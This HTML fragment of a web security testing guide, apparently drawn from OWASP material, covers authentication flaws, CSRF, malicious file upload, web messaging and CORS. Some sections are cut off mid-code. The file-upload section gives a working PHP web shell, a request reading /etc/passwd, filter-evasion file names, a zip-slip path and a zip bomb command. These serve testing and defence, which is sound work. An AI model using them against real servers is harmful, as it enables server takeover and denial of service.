	        <sl-details summary="Auth. Issue" open>
	        <h4>Authentication is a critical aspect of securing web applications. Authentication issues occur when there are weaknesses or flaws in the authentication process that allow unauthorized users to gain access to sensitive resources. These issues can be exploited by attackers to impersonate legitimate users, bypass security controls, or gain unauthorized access to accounts and systems. It's important to identify and mitigate these issues during the development and testing phases to protect user data and system integrity.</h4>

    <h2>Common Authentication Issues</h2>
    <p>Here are some of the most common authentication issues that may occur in web applications:</p>
    <ul>
        <li><strong>Weak Passwords:</strong> Users often choose weak passwords that are easy to guess or crack using brute-force or dictionary attacks. Using simple or common passwords increases the risk of account compromises.</li>
        <li><strong>Password Reuse:</strong> Reusing passwords across multiple sites makes it easier for attackers to access multiple accounts if one of them is compromised in a breach.</li>
        <li><strong>Brute Force Attacks:</strong> If there are no protections against brute-force login attempts (such as rate limiting, CAPTCHA, or account lockout), attackers can systematically try many password combinations until they succeed.</li>
        <li><strong>Insecure Storage of Passwords:</strong> Storing passwords in an insecure manner (e.g., plain text or weak hashing algorithms) exposes user credentials to potential attackers, especially if the database is breached.</li>
        <li><strong>Session Management Issues:</strong> Problems with session management, such as not invalidating sessions after logout or session hijacking, allow attackers to take over a valid session and impersonate the user.</li>
        <li><strong>Missing Multi-Factor Authentication (MFA):</strong> Without multi-factor authentication, attackers who obtain a user's password can easily compromise the account. MFA adds an additional layer of security by requiring a second form of verification (e.g., a code sent to the user's phone).</li>
        <li><strong>Weak Authentication Mechanisms:</strong> Using outdated or insecure authentication protocols like basic authentication (sending passwords in clear text) exposes sensitive data to interception and exploitation.</li>
        <li><strong>Failure to Protect Against Credential Stuffing:</strong> Credential stuffing attacks involve using previously exposed username and password pairs to try to gain access to accounts. Applications that don't detect or prevent such attacks are vulnerable.</li>
        <li><strong>Excessive Permissions:</strong> Giving users too many privileges, even for those that don’t require them, increases the risk of damage if an attacker gains access to the account.</li>
    </ul>

    <h2>Common Authentication Vulnerabilities</h2>
    <p>Authentication vulnerabilities may result from poor configuration, miscommunication, or flawed implementation. Some examples include:</p>
    <ul>
        <li><strong>Default Credentials:</strong> Some applications or devices are shipped with default usernames and passwords that may not be changed by users, making them an easy target for attackers.</li>
        <li><strong>Insecure Password Recovery Mechanisms:</strong> If password reset mechanisms do not implement proper authentication or validation, attackers may be able to hijack the account recovery process.</li>
        <li><strong>Unencrypted Authentication Tokens:</strong> Authentication tokens (such as JWTs or session cookies) must be securely transmitted over HTTPS to prevent interception by attackers. If they are sent over an unencrypted connection, attackers can steal the token and gain unauthorized access.</li>
        <li><strong>Exposed Authentication Information:</strong> Leaking authentication details like API keys, usernames, or passwords in code repositories or logs makes them accessible to unauthorized users or attackers.</li>
    </ul>

    <h2>Mitigating Authentication Issues</h2>
    <p>To prevent authentication issues and secure web applications, it is essential to follow best practices and adopt secure authentication techniques:</p>
    <ul>
        <li><strong>Use Strong Password Policies:</strong> Enforce strong password policies by requiring users to set passwords with a combination of upper and lower case letters, numbers, and special characters. Additionally, implement password strength meters to guide users.</li>
        <li><strong>Implement Multi-Factor Authentication (MFA):</strong> Always enable multi-factor authentication for sensitive applications to add an additional layer of security. This could involve something the user knows (password), something they have (OTP or phone), or something they are (biometric data).</li>
        <li><strong>Secure Password Storage:</strong> Store passwords securely using strong hashing algorithms like bcrypt, Argon2, or PBKDF2. Never store passwords in plain text, and always use salting to protect passwords from rainbow table attacks.</li>
        <li><strong>Use Secure Session Management:</strong> Ensure that user sessions are securely managed by using proper session expiration times, and invalidate sessions after logout or inactivity. Implement the HttpOnly and Secure flags for session cookies to protect against XSS and CSRF attacks.</li>
        <li><strong>Limit Login Attempts:</strong> Implement rate limiting or account lockout mechanisms to prevent brute-force attacks. After a set number of failed attempts, temporarily lock the account or implement CAPTCHA challenges to ensure the requests are coming from humans.</li>
        <li><strong>Use HTTPS for Secure Communication:</strong> Ensure that all sensitive data, including authentication credentials, are transmitted over HTTPS to prevent interception and man-in-the-middle (MITM) attacks.</li>
        <li><strong>Implement Password Expiry and Rotation:</strong> Force users to periodically change their passwords and implement controls to prevent password reuse across different accounts or services.</li>
        <li><strong>Secure API Authentication:</strong> When building APIs, ensure that proper authentication mechanisms (OAuth, API keys, etc.) are used to authenticate and authorize users, and never expose sensitive data in URLs or headers.</li>
        <li><strong>Monitor and Audit Authentication Logs:</strong> Regularly monitor and audit authentication logs for suspicious activity, such as failed login attempts, unusual login times, or access from unfamiliar locations.</li>
    </ul>

    <h2>Tools for Testing Authentication Issues</h2>
    <p>Several tools can help identify and test authentication issues, such as:</p>
    <ul>
        <li><strong>Burp Suite:</strong> A popular web vulnerability scanner that can be used to test for authentication issues like weak passwords, session management vulnerabilities, and brute-force attacks.</li>
        <li><strong>Hydra:</strong> A tool for performing brute-force attacks on login forms, useful for testing the strength of user authentication mechanisms.</li>
        <li><strong>OWASP ZAP:</strong> A security testing tool designed to find vulnerabilities, including authentication issues, in web applications and APIs.</li>
        <li><strong>John the Ripper:</strong> A password cracking tool that can be used to test the strength of hashed passwords and help identify weak password storage mechanisms.</li>
    </ul>

  </div>
  <div class="tab-pane fade" id="csrfn" role="tabpanel" aria-labelledby="csrfn-tab">
	        <sl-details summary="CSRF" open>
	        
    <h4>Cross-Site Request Forgery (CSRF), also known as one-click attack or session riding, is a type of attack that tricks the victim into performing actions on a web application where they are authenticated. The attacker exploits the trust that a website has in the user's browser, making it possible to execute unwanted actions without the user's consent. CSRF attacks can be used to perform actions like transferring funds, changing account settings, or making purchases without the victim’s knowledge.</h4>

    <h2>How CSRF Works</h2>
    <p>CSRF attacks work by exploiting the browser's automatic handling of cookies. When a user is logged into a web application, their browser automatically includes session cookies in every request to that application. An attacker can exploit this by tricking the user into submitting a request to a website where they are already authenticated.</p>
    
    <p>For example, consider a bank website where users can transfer money by submitting a form. If the user is already logged in, the bank automatically includes their session cookie in the request. An attacker could create a malicious website with a hidden form that sends a request to the bank’s website to transfer money from the victim’s account to the attacker’s. Because the browser automatically includes the session cookie, the bank considers the request legitimate and processes it.</p>

    <h2>Examples of CSRF Attacks</h2>
    <p>Here are some common examples of CSRF attacks:</p>
    <ul>
        <li><strong>Changing User Account Information:</strong> An attacker can trick a logged-in user into changing their account details, such as email address or password, without their knowledge.</li>
        <li><strong>Making Unauthorized Financial Transactions:</strong> In an online banking application, a CSRF attack can initiate a transfer of funds from the victim’s account to the attacker’s account.</li>
        <li><strong>Posting to Social Media Accounts:</strong> An attacker can exploit a logged-in user's session to post messages, links, or media to their social media account.</li>
        <li><strong>Changing Security Settings:</strong> CSRF can be used to disable security settings (e.g., two-factor authentication) on an account, leaving it vulnerable to further attacks.</li>
    </ul>

    <h2>How to Prevent CSRF Attacks</h2>
    <p>Several techniques can be employed to prevent CSRF attacks. Here are the most commonly used defenses:</p>
    <ul>
        <li><strong>Use Anti-CSRF Tokens:</strong> A unique token is included in each form submitted by the user. This token is checked on the server to ensure that the request came from the legitimate user and not an attacker. The server checks if the token sent with the request matches the one stored on the server for that session.</li>
        <li><strong>SameSite Cookies:</strong> The SameSite cookie attribute can be used to prevent cookies from being sent along with cross-site requests. By setting the SameSite attribute to "Strict" or "Lax", cookies will only be sent in first-party contexts, thus mitigating the risk of CSRF attacks.</li>
        <li><strong>Require User Interaction:</strong> Avoid performing critical actions (such as making payments or changing account settings) without some form of user interaction, such as entering a password or confirming the action via email or phone.</li>
        <li><strong>Use HTTPS:</strong> Ensuring the use of HTTPS prevents attackers from intercepting and modifying requests sent by the victim. CSRF attacks can be easier to execute over an unencrypted HTTP connection.</li>
        <li><strong>Custom Request Headers (CORS):</strong> Requiring custom headers (e.g., `X-Requested-With`) for certain requests can prevent malicious websites from initiating the request, as they cannot add custom headers to cross-origin requests due to the Same-Origin Policy.</li>
        <li><strong>Double Submit Cookie:</strong> This technique involves sending the CSRF token in both a cookie and a request parameter. The server then verifies that both values match. This makes it more difficult for an attacker to successfully execute a CSRF attack.</li>
    </ul>

    <h2>Identifying CSRF Vulnerabilities</h2>
    <p>To identify CSRF vulnerabilities, you can perform manual testing and use automated tools. Some common approaches include:</p>
    <ul>
        <li><strong>Testing Forms:</strong> Check if any forms (e.g., login, payment, or settings forms) lack anti-CSRF tokens or mechanisms to prevent unauthorized submissions from external sites.</li>
        <li><strong>Inspecting Headers:</strong> Ensure that the application is sending appropriate SameSite cookie attributes and that custom request headers are being used where necessary.</li>
        <li><strong>Automated Scanners:</strong> Tools like OWASP ZAP or Burp Suite can be used to automatically scan for CSRF vulnerabilities by looking for missing or improperly implemented anti-CSRF protections.</li>
    </ul>

    <h2>Tools to Prevent CSRF</h2>
    <p>There are various libraries and tools that can help implement anti-CSRF protection:</p>
    <ul>
        <li><strong>OWASP CSRFGuard:</strong> An open-source library that provides automatic CSRF protection to Java web applications.</li>
        <li><strong>Express CSRF:</strong> A Node.js middleware that protects Express applications from CSRF attacks by validating CSRF tokens.</li>
        <li><strong>Spring Security:</strong> A framework that provides built-in support for CSRF protection in Java-based web applications.</li>
        <li><strong>JWT (JSON Web Token):</strong> Tokens can be used to ensure that requests are originating from legitimate sources by validating them during authentication processes.</li>
    </ul>

      <sl-details summary="file uploads" open>
        <h1 id="test-upload-of-malicious-files">Test Upload of Malicious Files</h1>
    </br>
    <h4>Many application&rsquo;s business processes allow users to upload data to them. Although input validation is widely understood for text-based input fields, it is more complicated to implement when files are accepted. Although many sites implement simple restrictions based on a list of permitted (or blocked) extensions, this is not sufficient to prevent attackers from uploading legitimate file types that have malicious contents.</h4>
    <p>Vulnerabilities related to the uploading of malicious files is unique in that these &ldquo;malicious&rdquo; files can easily be rejected through including business logic that will scan files during the upload process and reject those perceived as malicious. Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still be malicious to the system.</p>
    <p>Finally, &ldquo;malicious&rdquo; means different things to different systems, for example malicious files that may exploit SQL server vulnerabilities may not be considered as &ldquo;malicious&rdquo; in an environment using a NoSQL data store.</p>
    <p>The application may allow the upload of malicious files that include exploits or shellcode without submitting them to malicious file scanning. Malicious files could be detected and stopped at various points of the application architecture such as: IPS/IDS, application server anti-virus software or anti-virus scanning by application as files are uploaded (perhaps offloading the scanning using SCAP).</p>
    <h3 id="example">Example</h3>
    <p>A common example of this vulnerability is an application such as a blog or forum that allows users to upload images and other media files. While these are considered safe, if an attacker is able to upload executable code (such as a PHP script), this could allow them to execute operating system commands, read and modify information in the filesystem, access the back end database and fully compromise the server.</p>
    <h2 id="test-objectives">Test Objectives</h2>
    <ul>
    <li>Identify the file upload functionality.</li>
    <li>Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.
    <ul>
    <li>If documentation is not available then consider what would be appropriate based on the purpose of the application.</li>
    </ul>
    </li>
    <li>Determine how the uploaded files are processed.</li>
    <li>Obtain or create a set of malicious files for testing.</li>
    <li>Try to upload the malicious files to the application and determine whether it is accepted and processed.</li>
    </ul>
    <h2 id="how-to-test">How to Test</h2>
    <h3 id="malicious-file-types">Malicious File Types</h3>
    <p>The simplest checks that an application can do are to determine that only trusted types of files can be uploaded.</p>
    <h4 id="web-shells">Web Shells</h4>
    <p>If the server is configured to execute code, then it may be possible to obtain command execution on the server by uploading a file known as a web shell, which allows you to execute arbitrary code or operating system commands. In order for this attack to be successful, the file needs to be uploaded inside the webroot, and the server must be configured to execute the code.</p>
    <p>Uploading this kind of shell onto an Internet facing server is dangerous, because it allows anyone who knows (or guesses) the location of the shell to execute code on the server. A number of techniques can be used to protect the shell from unauthorised access, such as:</p>
    <ul>
    <li>Uploading the shell with a randomly generated name.</li>
    <li>Password protecting the shell.</li>
    <li>Implementing IP based restrictions on the shell.</li>
    </ul>
    <p><strong>Remember to remove the shell when you are done.</strong></p>
    <p>The example below shows a simple PHP based shell, that executes operating system commands passed to it in a GET parameter, and can only be accessed from a specific IP address:</p>
    <div class="language-php highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="cp">&lt;?php</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_HOST'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"FIXME"</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Set your IP address here</span>
            <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
                <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
                <span class="k">echo</span> <span class="s2">"&lt;pre&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
                <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="cp">?&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the <code class="language-plaintext highlighter-rouge">cmd</code> GET parameter:</p>
    <p><code class="language-plaintext highlighter-rouge">https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd</code></p>
    <h4 id="filter-evasion">Filter Evasion</h4>
    <p>The first step is to determine what the filters are allowing or blocking, and where they are implemented. If the restrictions are performed on the client-side using JavaScript, then they can be trivially bypassed with an intercepting proxy.</p>
    <p>If the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including:</p>
    <ul>
    <li>Change the value of <code class="language-plaintext highlighter-rouge">Content-Type</code> as <code class="language-plaintext highlighter-rouge">image/jpeg</code> in HTTP request.</li>
    <li>Change the extensions to a less common extension, such as <code class="language-plaintext highlighter-rouge">file.php5</code>, <code class="language-plaintext highlighter-rouge">file.shtml</code>, <code class="language-plaintext highlighter-rouge">file.asa</code>, <code class="language-plaintext highlighter-rouge">file.jsp</code>, <code class="language-plaintext highlighter-rouge">file.jspx</code>, <code class="language-plaintext highlighter-rouge">file.aspx</code>, <code class="language-plaintext highlighter-rouge">file.asp</code>, <code class="language-plaintext highlighter-rouge">file.phtml</code>, <code class="language-plaintext highlighter-rouge">file.cshtml</code></li>
    <li>Change the capitalisation of the extension, such as <code class="language-plaintext highlighter-rouge">file.PhP</code> or <code class="language-plaintext highlighter-rouge">file.AspX</code></li>
    <li>If the request includes multiple file names, change them to different values.</li>
    <li>Using special trailing characters such as spaces, dots or null characters such as <code class="language-plaintext highlighter-rouge">file.asp...</code>, <code class="language-plaintext highlighter-rouge">file.php;jpg</code>, <code class="language-plaintext highlighter-rouge">file.asp%00.jpg</code>, <code class="language-plaintext highlighter-rouge">1.jpg%00.php</code></li>
    <li>In badly configured versions of nginx, uploading a file as <code class="language-plaintext highlighter-rouge">test.jpg/x.php</code> may allow it to be executed as <code class="language-plaintext highlighter-rouge">x.php</code>.</li>
    </ul>
    <h3 id="malicious-file-contents">Malicious File Contents</h3>
    <p>Once the file type has been validated, it is important to also ensure that the contents of the file are safe. This is significantly harder to do, as the steps required will vary depending on the types of file that are permitted.</p>
    <h4 id="malware">Malware</h4>
    <p>Applications should generally scan uploaded files with anti-malware software to ensure that they do not contain anything malicious. The easiest way to test for this is using the <a href="https://www.eicar.org/?page_id=3950">EICAR test file</a>, which is an safe file that is flagged as malicious by all anti-malware software.</p>
    <p>Depending on the type of application, it may be necessary to test for other dangerous file types, such as Office documents containing malicious macros. Tools such as the <a href="https://github.com/rapid7/metasploit-framework">Metasploit Framework</a> and the <a href="https://github.com/trustedsec/social-engineer-toolkit">Social Engineer Toolkit (SET)</a> can be used to generate malicious files for various formats.</p>
    <p>When this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the application processes the file, it may not be obvious whether this has taken place.</p>
    <h4 id="archive-directory-traversal">Archive Directory Traversal</h4>
    <p>If the application extracts archives (such as Zip files), then it may be possible to write to unintended locations using directory traversal. This can be exploited by uploading a malicious zip file that contains paths that traverse the file system using sequences such as <code class="language-plaintext highlighter-rouge">..\..\..\..\shell.php</code>. This technique is discussed further in the <a href="https://snyk.io/research/zip-slip-vulnerability">snyk advisory</a>.</p>
    <h4 id="zip-bombs">Zip Bombs</h4>
    <p>A <a href="https://en.wikipedia.org/wiki/Zip_bomb">Zip bomb</a> (more generally known as a decompression bomb) is an archive file that contains a large volume of data. It&rsquo;s intended to cause a denial of service by exhausting the disk space or memory of the target system that tries to extract the archive. Note that although the Zip format is the most example of this, other formats are also affected, including gzip (which is frequently used to compress data in transit).</p>
    <p>At its simplest level, a Zip bomb can be created by compressing a large file consisting of a single character. The example below shows how to create a 1MB file that will decompress to 1GB:</p>
    <div class="language-bash highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>/dev/zero <span class="nv">bs</span><span class="o">=</span>1M <span class="nv">count</span><span class="o">=</span>1024 | zip <span class="nt">-9</span> <span class="o">&gt;</span> bomb.zip
    </code></pre>
    </div>
    </div>
    <p>There are a number of methods that can be used to achieve much higher compression ratios, including multiple levels of compression, <a href="https://www.bamsoftware.com/hacks/zipbomb/">abusing the Zip format</a> and <a href="https://research.swtch.com/zip">quines</a> (which are archives that contain a copy of themselves, causing infinite recursion).</p>
    <p>A successful Zip bomb attack will result in a denial of service, and can also lead to increased costs if an auto-scaling cloud platform is used. <strong>Do not carry out this kind of attack unless you have considered these risks and have written approval to do so.</strong></p>
    <h4 id="xml-files">XML Files</h4>
    <p>XML files have a number of potential vulnerabilities such as XML eXternal Entities (XXE) and denial of service attacks such as the <a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">billion laughs attack</a>.</p>
    <p>These are discussed further in the <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection">Testing for XML Injection</a> guide.</p>
    <h4 id="other-file-formats">Other File Formats</h4>
    <p>Many other file formats also have specific security concerns that need to be taken into account, such as:</p>
    <ul>
    <li>CSV files may allow <a href="https://owasp.org/www-community/attacks/CSV_Injection">CSV injection attacks</a>.</li>
    <li>Office files may contain malicious macros or PowerShell code.</li>
    <li>PDFs may contain malicious JavaScript.</li>
    </ul>
    <p>The permitted file formats should be carefully reviewed for potentially dangerous functionality, and where possible attempts should be made to exploit this during testing.</p>
    <h3 id="source-code-review">Source Code Review</h3>
    <p>When there is file upload feature supported, the following API/methods are common to be found in the source code.</p>
    <ul>
    <li>Java: <code class="language-plaintext highlighter-rouge">new file</code>, <code class="language-plaintext highlighter-rouge">import</code>, <code class="language-plaintext highlighter-rouge">upload</code>, <code class="language-plaintext highlighter-rouge">getFileName</code>, <code class="language-plaintext highlighter-rouge">Download</code>, <code class="language-plaintext highlighter-rouge">getOutputString</code></li>

        <h1 id="testing-web-messaging">Testing Web Messaging</h1>
      </br>
      <h4>Web Messaging (also known as <a href="https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging">Cross Document Messaging</a>) allows applications running on different domains to communicate in a secure manner. Before the introduction of web messaging, the communication of different origins (between iframes, tabs and windows) was restricted by the same origin policy and enforced by the browser. Developers used multiple hacks in order to accomplish these tasks, and most of them were mainly insecure.</h4>
      <p>This restriction within the browser is in place to prevent a malicious website from reading confidential data from other iframes, tabs, etc; however, there are some legitimate cases where two trusted websites need to exchange data with each other. To meet this need, Cross Document Messaging was introduced in the <a href="https://html.spec.whatwg.org/multipage/">WHATWG HTML5</a> draft specification and was implemented in all major browsers. It enables secure communications between multiple origins across iframes, tabs and windows.</p>
      <p>The messaging API introduced the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"><code class="language-plaintext highlighter-rouge">postMessage()</code> method</a>, with which plain-text messages can be sent cross-origin. It consists of two parameters: message, and domain.</p>
      <p>There are some security concerns when using <code class="language-plaintext highlighter-rouge">*</code> as the domain that we discuss below. In order to receive messages, the receiving website needs to add a new event handler, which has the following attributes:</p>
      <ul>
      <li>Data, the content of the incoming message;</li>
      <li>Origin of the sender document; and</li>
      <li>Source, the source window.</li>
      </ul>
      <p>Here is an example of the messaging API in use. To send a message:</p>
      <div class="language-js highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nx">iframe1</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello world</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://www.example.com</span><span class="dl">"</span><span class="p">);</span>
      </code></pre>
      </div>
      </div>
      <p>To receive a message:</p>
      <div class="language-js highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">handler</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
      <span class="kd">function</span> <span class="nx">handler</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">chat.example.com</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
              <span class="cm">/* process message (event.data) */</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
              <span class="cm">/* ignore messages from untrusted domains */</span>
          <span class="p">}</span>
      <span class="p">}</span>
      </code></pre>
      </div>
      </div>
      <h3 id="origin-security">Origin Security</h3>
      <p>The origin is made up of a scheme, host name, and port. It uniquely identifies the domain sending or receiving the message, and does not include the path or the fragment part of the URL. For instance, <code class="language-plaintext highlighter-rouge">https://example.com</code> will be considered different from <code class="language-plaintext highlighter-rouge">http://example.com</code> because the schema of the former is <code class="language-plaintext highlighter-rouge">https</code>, while the latter is <code class="language-plaintext highlighter-rouge">http</code>. This also applies to web servers running in the same domain but on different ports.</p>
      <h2 id="test-objectives">Test Objectives</h2>
      <ul>
      <li>Assess the security of the message&rsquo;s origin.</li>
      <li>Validate that it&rsquo;s using safe methods and validating its input.</li>
      </ul>
      <h2 id="how-to-test">How to Test</h2>
      <h3 id="examine-origin-security">Examine Origin Security</h3>
      <p>Testers should check whether the application code is filtering and processing messages from trusted domains. Within the sending domain, also ensure that the receiving domain is explicitly stated, and that <code class="language-plaintext highlighter-rouge">*</code> is not used as the second argument of <code class="language-plaintext highlighter-rouge">postMessage()</code>. This practice could introduce security concerns and could lead to, in the case of a redirection or if the origin changes by other means, the website sending data to unknown hosts, and therefore, leaking confidential data to malicious servers.</p>
      <p>If the website fails to add security controls to restrict the domains or origins that are allowed to send messages to a website, it is likely to introduce a security risk. Testers should examine the code for message event listeners and get the callback function from the <code class="language-plaintext highlighter-rouge">addEventListener</code> method for further analysis. Domains must always be verified prior to data manipulation.</p>
      <h3 id="examine-input-validation">Examine Input Validation</h3>
      <p>Although the website is theoretically accepting messages from trusted domains only, data must still be treated as externally-sourced, untrusted data, and processed with the appropriate security controls. Testers should analyze the code and look for insecure methods, in particular where data is being evaluated via <code class="language-plaintext highlighter-rouge">eval()</code> or inserted into the DOM via the <code class="language-plaintext highlighter-rouge">innerHTML</code> property, which may create DOM-based XSS vulnerabilities.</p>
      <h3 id="static-code-analysis">Static Code Analysis</h3>
      <p>JavaScript code should be analyzed to determine how web messaging is implemented. In particular, testers should be interested in how the website is restricting messages from untrusted domains, and how the data is handled even for trusted domains.</p>
      <p>In this example, access is needed for every subdomain (www, chat, forums, &hellip;) within the owasp.org domain. The code is trying to accept any domain with <code class="language-plaintext highlighter-rouge">.owasp.org</code>:</p>
      <div class="language-js highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">callback</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

      <span class="kd">function</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">origin</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">.owasp.org</span><span class="dl">"</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
              <span class="cm">/* process message (e.data) */</span>
          <span class="p">}</span>
      <span class="p">}</span>
      </code></pre>
      </div>
      </div>
      <p>The intention is to allow subdomains such as:</p>
      <ul>
      <li><code class="language-plaintext highlighter-rouge">www.owasp.org</code></li>
      <li><code class="language-plaintext highlighter-rouge">chat.owasp.org</code></li>
      <li><code class="language-plaintext highlighter-rouge">forums.owasp.org</code></li>
      </ul>
      <p>Unfortunately, this introduces vulnerabilities. An attacker can easily bypass the filter since a domain such as <code class="language-plaintext highlighter-rouge">www.owasp.org.attacker.com</code> will match.</p>
      <p>Here is an example of code that lacks an origin check. This is very insecure, as it will accept input from any domain:</p>
      <div class="language-js highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">callback</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

      <span class="p">}</span>
      </code></pre>
      </div>
      </div>
      <p>Here is an example with input validation vulnerabilities that may lead to XSS attack:</p>
      <div class="language-js highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">callback</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

        <h1 id="testing-cross-origin-resource-sharing">Testing Cross Origin Resource Sharing</h1>
      
      <h4><a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">Cross Origin Resource Sharing</a> (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest (XHR) Level 2 (L2) API in a controlled manner. In the past, the XHR L1 API only allowed requests to be sent within the same origin as it was restricted by the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same Origin Policy</a> (SOP).</h4>
      <p>Cross-origin requests have an <code class="language-plaintext highlighter-rouge">Origin</code> header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers">headers</a> are used to accomplish this.</p>
      <p>The <a href="https://www.w3.org/TR/cors/">W3C CORS specification</a> mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.</p>
      <h3 id="origin--access-control-allow-origin">Origin &amp; Access-Control-Allow-Origin</h3>
      <p>The <code class="language-plaintext highlighter-rouge">Origin</code> request header is always sent by the browser in a CORS request and indicates the origin of the request. The Origin header cannot be changed from JavaScript as <a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name">the browser (the user-agent) blocks its modification</a>; however, relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, for example by using a proxy, so you still need to check that application-level protocols are used to protect sensitive data.</p>
      <p><code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.</p>
      <p>From a security testing perspective you should look for insecure configurations as for example using a <code class="language-plaintext highlighter-rouge">*</code> wildcard as value of the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header that means all domains are allowed. Another insecure example is when the server returns back the origin header without any additional checks, which can lead to access of sensitive data. Note that the configuration of allowing cross-origin requests is very insecure and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.</p>
      <h3 id="access-control-request-method--access-control-allow-method">Access-Control-Request-Method &amp; Access-Control-Allow-Method</h3>
      <p>The <code class="language-plaintext highlighter-rouge">Access-Control-Request-Method</code> header is used when a browser performs a preflight OPTIONS request and lets the client indicate the request method of the final request. On the other hand, the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Method</code> is a response header used by the server to describe the methods the clients are allowed to use.</p>
      <h3 id="access-control-request-headers--access-control-allow-headers">Access-Control-Request-Headers &amp; Access-Control-Allow-Headers</h3>
      <p>These two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.</p>
      <h3 id="access-control-allow-credentials">Access-Control-Allow-Credentials</h3>
      <p>This response header allows browsers to read the response when credentials are passed. When the header is sent, the web application must set an origin to the value of the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header. The <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials</code> header cannot be used along with the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header whose value is the <code class="language-plaintext highlighter-rouge">*</code> wildcard like the following:</p>
      <div class="language-http highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="err">Access-Control-Allow-Origin: *
      Access-Control-Allow-Credentials: true
      </span></code></pre>
      </div>
      </div>
      <h3 id="input-validation">Input Validation</h3>
